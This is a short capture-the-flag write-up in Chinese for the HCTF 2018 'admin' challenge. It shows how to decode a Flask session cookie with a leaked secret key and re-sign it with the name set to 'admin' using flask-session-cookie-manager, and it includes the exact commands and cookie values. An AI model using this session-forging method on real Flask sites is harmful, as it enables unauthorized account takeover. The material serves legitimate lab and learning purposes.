# flask

## [HCTF 2018]admin 1

如果session等于admin就出hctf{}，即flag

而提示flask就有用了，flask是轻量级web框架，session存在客户端，我们可以伪造session（cookie）

[flask编码解码器](https://github.com/noraj/flask-session-cookie-manager)

去到它的目录下，可以看到setup.py

win+r输入cmd，cd到该目录，输入以下语句安装。安装成功后可以用pip list确认清单是否有flask相关

```cmd
python setup.py install
```

输入`py3 flask3.py decode -h`显示decode帮助-s “…” （secret key）-c “…” （session ckkie value）可以不加引号，最好加

secret key在config.py

session ckkie value在随便一个页面存储的cookie里

解码

```cmd
py3 flask3.py decode -s ckj123 -c ".eJw9kEFvgkAQRv9KM2cOsOiFxAPNAjHpDMEskt2LsYqWXdY2oKms8b93tYmHOb3k5Xtzg81haMcvSM7DpQ1g0-0hucHbJyQghWFUKKsKOZdNNSOODt3Okcs7cnWorL9i3VMjIxR4RWd-PZ9IKyOZsiSyWIl6pkTek-it4mlEeneVrvaOdCK-0kqQKT2Xet1hgyHxY0QMJxSky2LVo3u3VCBTnAzpNPSOGLXfoh88m5dNxmSTLeAewG4cDpvzt2lPrwTF884H9ChyI20Vkt5bYtUkxSPBOOJ1XPJeo669aunVy5iOi6eus9tj-zJh_fNB6T85ba0HELEYAriM7fD8GkQh3P8AhlRrKA.YAFz_w.drvVUPQMecMpeOp54B9BuvgM--8"
```

把name后面的你登录的用户名改为admin再加密

```cmd
py3 flask3.py encode -s ckj123 -t "{'_fresh': True, '_id': b'a964ffdf9ad843337371b754fe4dee5f513139037266dcff517e58e1e59fd05671c5370244ce3d91eb5b1c44857c213c8de30f4c6d3d604d0724863c8a99a6aa', 'csrf_token': b'd1bffe11dbd467f7d2a1b79345789c2599b72276', 'image': b'1JK4', 'name': 'admin', 'user_id': '10'}"
```

把加密后的session输回去然后返回index主页就可以看到flag